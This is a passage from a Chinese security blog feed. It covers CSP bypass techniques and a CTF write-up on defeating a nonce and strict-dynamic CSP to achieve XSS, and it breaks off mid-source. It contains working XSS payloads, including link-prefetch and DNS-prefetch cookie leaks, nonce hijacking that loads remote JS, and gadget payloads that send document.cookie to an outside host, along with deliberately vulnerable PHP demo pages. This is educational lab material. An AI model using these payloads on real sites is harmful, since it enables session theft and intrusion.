self"></a>4、利用link绕过xx-src self</h3><p>CSP策略中xx-src self的设置能够使大部分的XSS和CSRF都会失效，但link标签的预加载功能可以进行绕过。</p><p>在Chrome下，可以使用如下标签发送cookie（最新版Chrome会禁止）：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"prefetch"</span> <span class="attr">href</span>=<span class="string">"https://www.mi1k7ea.com/c.php?c=[cookie]"</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在Firefox下，可以将cookie作为子域名，用DNS预解析的方式把cookie带出去，查看DNS服务器的日志就能得到cookie：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"dns-prefetch"</span> <span class="attr">href</span>=<span class="string">"//[cookie].mi1k7ea.com"</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在后面的iframe中会有结合利用的示例。</p><h3 id="5、利用浏览器补全绕过script-nonce"><a href="#5、利用浏览器补全绕过script-nonce" class="headerlink" title="5、利用浏览器补全绕过script nonce"></a>5、利用浏览器补全绕过script nonce</h3><p>有时候CSP策略可能会设置成如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: default-src &apos;none&apos;;script-src &apos;nonce-xxx&apos;</span><br></pre></td></tr></table></figure><p>这种情况下，script标签需要带上正确的nonce属性值才能执行JS代码。</p><p>如果，出现了脚本插入点在含有nonce属性值的script标签前面的情况时，如：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>插入点<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">id</span>=<span class="string">"aa"</span> <span class="attr">nonce</span>=<span class="string">"abc"</span>&gt;</span><span class="undefined">document.write('CSP');</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>可以插入如下内容来利用浏览器补全功能：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"http://192.168.248.1/a.js"</span> <span class="attr">a</span>=<span class="string">"</span></span></span><br></pre></td></tr></table></figure><p>最终形成如下页面结构：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"http://192.168.248.1/a.js"</span> <span class="attr">a</span>=<span class="string">"&lt;/p&gt;</span></span></span><br><span class="line"><span class="tag"><span class="string">&lt;script id="</span><span class="attr">aa</span>" <span class="attr">nonce</span>=<span class="string">"xxx"</span>&gt;</span><span class="undefined">document.write('CSP');</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>也就是说，利用浏览器补全的功能，在含有nonce的script标签前面的插入点插入script标签的同时，插入a=”以闭合后面script标签的第一个属性的双引号，从而使中间的内容失效，将本来的nonce属性劫持到了插入的script标签中，使得该插入标签可以正常执行JS代码，也就是说浏览器会给我们自动补全只有一个双引号的属性的值。</p><p>还有一个注意点，上述的a标签在Chrome上是执行不了的，原因在于Chrome对于标签的解析方式则不同，Chrome中解析script标签的优先级高于解析属性双引号内的值，因而前面双引号闭合的时候没法正常使其失效。但是这里可以使用src属性替代，使其可在Chrome下正常执行。</p><p><strong>Demo</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$nonce = md5(openssl_random_pseudo_bytes(16));</span><br><span class="line">header(&quot;Content-Security-Policy: default-src &apos;none&apos;; script-src &apos;nonce-$nonce&apos;; &quot;);</span><br><span class="line">?&gt;</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;CSP Test&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h2&gt;CSP Test&lt;/h2&gt;</span><br><span class="line">&lt;form action=&quot;test.php&quot; method=&quot;post&quot;&gt;</span><br><span class="line">&lt;input type=&quot;text&quot; name=&quot;content&quot;&gt;</span><br><span class="line">&lt;button type=&quot;submit&quot;&gt;Go&lt;/button&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">if (isset($_POST[&apos;content&apos;])) &#123;</span><br><span class="line">echo &quot;Your POST content: &lt;p&gt;&quot;.@$_POST[&apos;content&apos;].&quot;&lt;/p&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;script type=&quot;text/javascript&quot; nonce=&lt;?php echo $nonce;?&gt;&gt;document.write(&quot;Mi1k7ea&quot;)&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>当我们输入<code>&lt;script src=&quot;http://192.168.43.201/a.js&quot; a=&quot;</code>时即会弹框：</p><p><img src="/2019/02/24/CSP策略及绕过技巧小结/1.png" alt=""></p><p>查看元素，看到输入的script标签的a属性的双引号将后面含有nonce的script标签第一个含有双引号的属性都给闭合了，成功劫持了nonce属性进而加载外部JS弹框：</p><p><img src="/2019/02/24/CSP策略及绕过技巧小结/2.png" alt=""></p><p>值得注意的就是，要想成功利用在nonce属性前需要存在一个用引号括起来的属性，不然会失效。</p><p>另外，在之前做过的一道CSP题目中，也有应用到这种方法，可以参考学习一下：<a href="https://www.mi1k7ea.com/2019/02/21/%E4%B8%80%E9%81%93%E7%BB%95%E8%BF%87CSP%E7%9A%84XSS%E9%A2%98%E7%9B%AE/" target="_blank" rel="noopener">一道绕过CSP的XSS题目</a></p><h3 id="6、利用Gadgets和strict-dynamic-unsafe-eval绕过"><a href="#6、利用Gadgets和strict-dynamic-unsafe-eval绕过" class="headerlink" title="6、利用Gadgets和strict-dynamic/unsafe-eval绕过"></a>6、利用Gadgets和strict-dynamic/unsafe-eval绕过</h3><p>即重用Gadgets代码来绕过CSP，具体可参考Black Hat 2017的<a href="https://www.blackhat.com/docs/us-17/thursday/us-17-Lekies-Dont-Trust-The-DOM-Bypassing-XSS-Mitigations-Via-Script-Gadgets.pdf" target="_blank" rel="noopener">ppt</a>，上面总结了可以被用来绕过CSP的一些JS库。</p><p>例如假设页面中使用了Jquery-mobile库，并且CSP策略中包含”script-src ‘unsafe-eval’”或者”script-src ‘strict-dynamic’”，那么下面的向量就可以绕过CSP：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">data-role</span>=<span class="string">popup</span> <span class="attr">id</span>=<span class="string">'&lt;script&gt;alert(1)&lt;/script&gt;'</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在这个PPT之外的还有一些库也可以被利用，例如RCTF2018中遇到的amp库，下面的标签可以获取名字为FLAG的cookie：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">amp-pixel</span> <span class="attr">src</span>=<span class="string">"http://your domain/?cid=CLIENT_ID(FLAG)"</span>&gt;</span><span class="tag">&lt;/<span class="name">amp-pixel</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在做过的一道CSP题目中，也有应用到这种方法，可以参考学习一下：<a href="https://www.mi1k7ea.com/2019/02/21/%E4%B8%80%E9%81%93%E7%BB%95%E8%BF%87CSP%E7%9A%84XSS%E9%A2%98%E7%9B%AE/" target="_blank" rel="noopener">一道绕过CSP的XSS题目</a></p><h3 id="7、利用iframe绕过"><a href="#7、利用iframe绕过" class="headerlink" title="7、利用iframe绕过"></a>7、利用iframe绕过</h3><p>（1）如果页面A中有CSP限制，但是页面B中没有，同时A和B同源，那么就可以在A页面中包含B页面来绕过CSP：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"B"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure><p>下面简单地搞个示例。</p><p>1.php代码，有CSP限制，但可以通过iframe加载同源的页面：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$nonce = md5(openssl_random_pseudo_bytes(16));</span><br><span class="line">header(&quot;Content-Security-Policy: default-src &apos;none&apos;; script-src &apos;nonce-$nonce&apos;; frame-src &apos;self&apos;; &quot;);</span><br><span class="line">?&gt;</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;CSP Test&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h2&gt;CSP Test&lt;/h2&gt;</span><br><span class="line">&lt;form action=&quot;1.php&quot; method=&quot;post&quot;&gt;</span><br><span class="line">&lt;input type=&quot;text&quot; name=&quot;content&quot;&gt;</span><br><span class="line">&lt;button type=&quot;submit&quot;&gt;Go&lt;/button&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">if (isset($_POST[&apos;content&apos;])) &#123;</span><br><span class="line">echo &quot;Your POST content: &lt;p&gt;&quot;.@$_POST[&apos;content&apos;].&quot;&lt;/p&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>2.php简单写为<code>&lt;script&gt;alert(&#39;Mi1k7ea&#39;)&lt;/script&gt;</code>。</p><p>在访问1.php时，直接输入script标签是无法执行弹框的，但可以通过iframe引入同源的2.php来执行该页面的JS代码，输入<code>&lt;iframe src=&#39;http://127.0.0.1/2.php&#39;&gt;&lt;/iframe&gt;</code>：</p><p><img src="/2019/02/24/CSP策略及绕过技巧小结/8.png" alt=""></p><p>（2）在Chrome下，iframe标签支持csp属性，这有时候可以用来绕过一些防御，例如”<a href="http://xxx" target="_blank" rel="noopener">http://xxx</a>“页面有个js库会过滤XSS向量，我们就可以使用csp属性来禁掉这个js库：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">csp</span>=<span class="string">"script-src 'unsafe-inline'"</span> <span class="attr">src</span>=<span class="string">"http://xxx"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure><p>（3）绕过sandbox：</p><p><strong>Demo</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">header(&quot;Content-Security-Policy: default-src &apos;self&apos; &apos;unsafe-inline&apos;; sandbox allow-forms allow-same-origin allow-scripts allow-modals allow-popups&quot;);</span><br><span class="line">setcookie(&apos;milk&apos;,&apos;tea&apos;);</span><br><span class="line">?&gt;</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;CSP Test&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;script&gt;&lt;?php echo $_GET[&apos;xss&apos;];?&gt;&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure><p>当CSP设置为allow-popups开启时，window.open等就可以打开新的窗口，这时直接就能利用了，直接输入<code>?xss=window.location.href=&#39;http://172.20.10.8:8000//?cookie=&#39;+document.cookie</code>就能顺利地带出cookie信息。</p><p>但是要是远程加载JS文件是不满足CSP规则的。</p><p>但是如果上述CSP策略没有allow-popups，则不能如此直接地利用。</p><h3 id="8、利用meta绕过CSP-nonce"><a href="#8、利用meta绕过CSP-nonce" class="headerlink" title="8、利用meta绕过CSP nonce"></a>8、利用meta绕过CSP nonce</h3><p>meta标签有一些不常用的功能有时候有奇效：</p><p>meta可以控制缓存（在header没有设置的情况下），有时候可以用来绕过CSP nonce：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"cache-control"</span> <span class="attr">content</span>=<span class="string">"public"</span>&gt;</span></span><br></pre></td></tr></table></figure><p>meta可以设置Cookie（Firefox下），可以结合self-xss利用：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Set-Cookie"</span> <span class="attr">Content</span>=<span class="string">"cookievalue=xxx;expires=Wednesday,21-Oct-98 16:14:21</span></span></span><br></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.jianshu.com/p/f1de775bc43e" target="_blank" rel="noopener">CSP策略及绕过方法</a></p><p><a href="https://www.cnblogs.com/afanti/p/9298415.html" target="_blank" rel="noopener">通过iframe标签绕过csp</a></p><p><a href="http://www.bubuko.com/infodetail-2152128.html" target="_blank" rel="noopener">CSP学习和绕过</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;何为CSP&quot;&gt;&lt;a href=&quot;#何为CSP&quot; class=&quot;headerlink&quot; title=&quot;何为CSP&quot;&gt;&lt;/a&gt;何为CSP&lt;/h2&gt;&lt;p&gt;CSP（Content Security Policy）即内容安全策略，为了缓解很大一部分潜在的跨站脚本问题，浏览器
      
    
    </summary>
    
      <category term="Web安全基础" scheme="https://Mi1k7ea.github.com/categories/Web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"/>
    
    
      <category term="Web安全" scheme="https://Mi1k7ea.github.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="XSS" scheme="https://Mi1k7ea.github.com/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>一道绕过CSP的XSS题目</title>
    <link href="https://Mi1k7ea.github.com/2019/02/21/%E4%B8%80%E9%81%93%E7%BB%95%E8%BF%87CSP%E7%9A%84XSS%E9%A2%98%E7%9B%AE/"/>
    <id>https://Mi1k7ea.github.com/2019/02/21/一道绕过CSP的XSS题目/</id>
    <published>2019-02-21T14:12:05.000Z</published>
    <updated>2019-02-23T15:06:41.128Z</updated>
    
    <content type="html"><![CDATA[<p>之前CTF做的一道需要绕过CSP的XSS题目，具体的代码没记下来，这里写个类似的来复现。</p><h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>这里由于是本地写的类似程序，目标为弹框显示“1”即可。</p><p>访问目标站点，如下图所示，看到提示输入URL：</p><p><img src="/2019/02/21/一道绕过CSP的XSS题目/1.png" alt=""></p><p>啥也不输入，点击Go，发现URL栏多了name参数和url参数：</p><p> <img src="/2019/02/21/一道绕过CSP的XSS题目/2.png" alt=""></p><p>查看源码，发现查看不到页面上显示的“Mi1k7ea”，推测应该是动态插入DOM生成的吧，右键查看元素，看到如下结构：</p><p><img src="/2019/02/21/一道绕过CSP的XSS题目/3.png" alt=""></p><p>其中在header头和最后各包含一段JS代码，其中的script标签都含有nonce属性，推测应该是采用了CSP策略，多次访问nonce属性值都不一样，即是随机生成的。中间是URL栏中name参数的插入点，插入到id为”yourname”的a标签中显示到页面中。</p><p>这里可以看到，header头的JS代码是对DOM的动态操作，$(document).read即页面加载完执行；最后的JS代码为处理URL和创建Node，然后被前面的JS动态插入DOM节点中。</p><p>既然涉及到了CSP，抓包看看它设置的策略吧：</p><p><img src="/2019/02/21/一道绕过CSP的XSS题目/4.png" alt=""></p><p>其CSP设置如下：</p><p>Content-Security-Policy: default-src ‘none’; script-src ‘nonce-96a80ac6288a465630f4e631bf2f192e’ ‘strict-dynamic’; base-uri ‘self’; style-src ‘self’; font-src ‘self’</p><p>关键点应该是前两个，即default-src ‘none’;和script-src ‘nonce-xx’ ‘strict-dynamic’;</p><p>因为前面header头的JS是动态添加DOM节点的，推测应该和strict-dynamic这个相关，可参考<a href="https://www.blackhat.com/docs/us-17/thursday/us-17-Lekies-Dont-Trust-The-DOM-Bypassing-XSS-Mitigations-Via-Script-Gadgets.pdf" target="_blank" rel="noopener">black hat 2017关于script gadgets绕过CSP</a>。</p><h2 id="XSS-payload注入"><a href="#XSS-payload注入" class="headerlink" title="XSS payload注入"></a>XSS payload注入</h2><p>从前面的题目分析可知，页面的输入点有两处，即GET方式的name参数和url参数。</p><p>其中name参数是输入到id为”yourname”的a标签中，尝试对其进行XSS测试，发现会直接返回输入的内容，即已经实体编码了，利用点应该不在这：</p><p><img src="/2019/02/21/一道绕过CSP的XSS题目/5.png" alt=""></p><p>另一个参数url，可通过input栏输入提交，尝试输入标签内容，发现提示输入内容为非法URL：</p><p><img src="/2019/02/21/一道绕过CSP的XSS题目/6.png" alt=""></p><p>那就输入一个外部URL地址如<a href="http://www.mi1k7ea.com" target="_blank" rel="noopener">本博客</a>，发现提示只能输入服务端本身的URL，即应该限定了只能输入访问本地的URL，并且限制了只能是协议://ip:port这种形式才能正常执行：</p><p><img src="/2019/02/21/一道绕过CSP的XSS题目/7.png" alt=""></p><p>本地有个test.txt文件可以访问，输入该文件地址，可以查看到页面将文件内容直接输出到pre标签中，这里可以推测，后台应该是调用file_get_content()来获取目标URL内容的：</p><p><img src="/2019/02/21/一道绕过CSP的XSS题目/14.png" alt=""></p><p>那么问题来了，限制了只能通过协议://ip:port这种形式来作为开头输入，并且限定只能是服务端的IP，那不就没法注入XSS payload了？</p><p>当时卡在这里卡了很久，后面发现，这是PHP的题目，是不是可以利用PHP伪协议？要想输入的内容能显现在页面中，能与之相关联的伪协议即data://伪协议。</p><p>测试一下，在输入框输入：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">data://127.0.0.1/;base64,PGltZz4=</span><br><span class="line">其中PGltZz4=为&lt;img&gt;的base64编码结果</span><br></pre></td></tr></table></figure><p><img src="/2019/02/21/一道绕过CSP的XSS题目/8.png" alt=""></p><p>检查元素可以看到，img标签成功插入到页面中显示出来。</p><p>接下来直接插入script标签尝试弹框：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">data://127.0.0.1/;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==</span><br><span class="line">PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==为&lt;script&gt;alert(1)&lt;/script&gt;的base64编码结果</span><br></pre></td></tr></table></figure><p>发现标签是插进去了，但是没有弹框，意料之中，我们的script标签没有nonce值，被CSP策略拦截不可执行了：</p><p><img src="/2019/02/21/一道绕过CSP的XSS题目/9.png" alt=""></p><h2 id="CSP绕过"><a href="#CSP绕过" class="headerlink" title="CSP绕过"></a>CSP绕过</h2><p>关于CSP绕过，这里主要有两种方式。主要参考自<a href="https://www.jianshu.com/p/f1de775bc43e" target="_blank" rel="noopener">CSP策略及绕过方法</a>。</p><h3 id="利用浏览器补全功能绕过"><a href="#利用浏览器补全功能绕过" class="headerlink" title="利用浏览器补全功能绕过"></a>利用浏览器补全功能绕过</h3><p>由前面知道，我们的script标签由于没有nonce，而CSP中设置的其中一条 script-src ‘nonce-xx’ ‘strict-dynamic’; 限定了有随机nonce值或由有nonce的标签动态生成的script才能执行。</p><p>这里关注前面的script-src ‘nonce-xx’，我们想一下，是不是可以劫持某个script标签的nonce属性呢？</p><p>在参考的文章中说到：</p><p><img src="/2019/02/21/一道绕过CSP的XSS题目/10.png" alt=""></p><p>也就是说，利用浏览器补全的功能，在含有nonce的script标签前面的插入点插入script标签的同时，插入a=”以闭合后面script标签的第一个属性的双引号，从而使中间的内容失效，将本来的nonce属性劫持到了插入的script标签中，使得该插入标签可以正常执行JS代码，也就是说浏览器会给我们自动补全只有一个双引号的属性的值。</p><p>我们回过头来看看页面代码布局，可以看到在插入的标签后面在一段拥有nonce属性的script标签，就是它了：</p><p><img src="/2019/02/21/一道绕过CSP的XSS题目/11.png" alt=""></p><p>构造payload：我们需要先闭合掉前面的pre和form标签，然后再插入script标签；在script标签中，先写入包含远程恶意js代码文件的src属性，再添加a=”。即</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">将 &lt;/pre&gt;&lt;/form&gt;&lt;script src=&quot;http://192.168.248.1/a.js&quot; a=&quot;  Base64加密即可</span><br><span class="line">data://127.0.0.1/;base64,PC9wcmU+PC9mb3JtPjxzY3JpcHQgc3JjPSJodHRwOi8vMTkyLjE2OC4yNDguMS9hLmpzIiBhPSI=</span><br></pre></td></tr></table></figure><p>直接输入payload访问：</p><p><img src="/2019/02/21/一道绕过CSP的XSS题目/12.png" alt=""></p><p>成功弹框，没有问题。</p><p>再看一下页面元素：</p><p><img src="/2019/02/21/一道绕过CSP的XSS题目/13.png" alt=""></p><p>这里再解释一遍，把pre和form标签闭合之后，输入<code>&lt;script src=xxx a=&quot;</code>的内容，由于浏览器的补全功能，a标签的双引号会和最后的script标签的第一个元素即type的双引号闭合掉，从而使中间的内容即第一个红框内的内容无效，导致后面的内容自己成为新的属性，包括nonce属性，从而成功劫持了最后的script标签的nonce属性为插入的script属性，最终成功执行。</p><p>但是上述的a标签在Chrome上是执行不了的，原因在于Chrome对于标签的解析方式则不同，Chrome中解析script标签的优先级高于解析属性双引号内的值，因而前面双引号闭合的时候没法正常使其失效。但是这里可以使用src属性替代，使其可在Chrome下正常执行。</p><h3 id="利用strict-dynamic结合gadget绕过"><a href="#利用strict-dynamic结合gadget绕过" class="headerlink" title="利用strict-dynamic结合gadget绕过"></a>利用strict-dynamic结合gadget绕过</h3><p>这里探讨第二种方法。</p><p>前面知道，CSP设置了strict-dynamic，结合查阅的Black Hat 2017的文章可知，我们可以在页面上找一个可以动态生成DOM节点的JS Gadget，然后通过某些方式来劫持其中的DOM节点元素，从而使动态生成的标签可以继承该Gadget的nonce直接执行JS代码。</p><p>我们再分析一遍源码：</p><p><img src="/2019/02/21/一道绕过CSP的XSS题目/15.png" alt=""></p><p>由之前的分析知道，最后的script标签中是处理URL和创建节点，然后再被head处的JS动态插入到DOM节点中。DOM元素id即为全局变量。我们注意到最后的script标签的JS代码中定义了一个全局变量i，而i在head处的JS代码中被动态添加到id为forminput的标签中（即绿框框中的div标签），并且当i.name不为空时，将i.name的值设置到id为yourname的标签中（即绿框框中的a标签）。这里看到，div标签在a标签前面，也就是说，我们可以通过闭合使最后的JS代码失效，从而可以劫持i，再通过i来创建新标签来劫持yourname；最后看到蓝框，params[“name”]可以通过创建一个新的标签，其分别有两个属性，id属性值为params，name属性值为要执行的JS代码，接着将id为yourname的标签设置为script标签即可（因为蓝框中的代码就是将id为params的标签的name属性值放入id为yourname的标签中，进而实现将恶意Js代码放入script标签中）。由strict-dynamic知，head的JS代码动态创建的JS是受信任的，因此该动态创建的script标签可以执行恶意JS代码。</p><p>构造payload：先闭合掉pre和form标签，至于最后面的script可以通过在最后输入<code>&lt;script&gt;</code>来使其失效；id为yourname的标签为script标签，但该标签没有name属性、需要多输入一个包含name属性且id为params的标签；因此，劫持i的标签需可以内嵌多个标签。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;/<span class="name">pre</span>&gt;</span><span class="tag">&lt;/<span class="name">form</span>&gt;</span><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"i"</span>&gt;</span><span class="tag">&lt;<span class="name">script</span> <span class="attr">id</span>=<span class="string">"yourname"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">"params"</span> <span class="attr">name</span>=<span class="string">"alert(1)"</span> /&gt;</span>&gt;<span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br></pre></td></tr></table></figure><p>当然div标签可以换成span、form等，textarea标签可换成input、textarea、button、iframe、object等标签，效果一样。</p><p>Base64编码后添加到data://伪协议后面构造最终payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data://127.0.0.1/plain;base64,PC9wcmU+PC9mb3JtPjxkaXYgaWQ9ImkiPjxzY3JpcHQgaWQ9InlvdXJuYW1lIj48L3NjcmlwdD48YSBpZD0icGFyYW1zIiBuYW1lPSJhbGVydCgxKSIgLz4+PC9kaXY+PHNjcmlwdD4=</span><br></pre></td></tr></table></figure><p>直接输入运行，弹框了：</p><p><img src="/2019/02/21/一道绕过CSP的XSS题目/16.png" alt=""></p><p>查看元素，看到箭头处输入的script标签将后面的JS代码闭合失效了，而在红框id为forminput的div标签内，动态创建了id为i的div标签，该标签内含有一个id为yourname的script标签和id为params、name为恶意JS代码的a标签：</p><p><img src="/2019/02/21/一道绕过CSP的XSS题目/17.png" alt=""></p><p>至此，我们成功利用strict-dynamic结合gadget来绕过CSP实现XSS弹框了。</p><p>能够弹框，就肯定能够执行其他XSS payload了，如返回cookie的payload如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;/pre&gt;&lt;/form&gt;&lt;div id=&quot;i&quot;&gt;&lt;script id=&quot;yourname&quot;&gt;&lt;/script&gt;&lt;a id=&quot;params&quot; name=&quot;window.open(&apos;//a.com/?&apos;+escape(document.cookie))&quot; /&gt;&gt;&lt;/div&gt;&lt;script&gt;</span><br><span class="line">或</span><br><span class="line">&lt;/pre&gt;&lt;/form&gt;&lt;div id=&quot;i&quot;&gt;&lt;script id=&quot;yourname&quot;&gt;&lt;/script&gt;&lt;a id=&quot;params&quot; name=&quot;window.location.href=&apos;http://a.com/?cookie=&apos;+document.cookie&quot; /&gt;&gt;&lt;/div&gt;&lt;script&gt;</span><br></pre></td></tr></table></figure><p><img src="/2019/02/21/一道绕过CSP的XSS题目/18.png" alt=""></p><h2 id="模仿写的源码"><a href="#模仿写的源码" class="headerlink" title="模仿写的源码"></a>模仿写的源码</h2><p>以下为模仿写的代码，仅供参考练习。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span 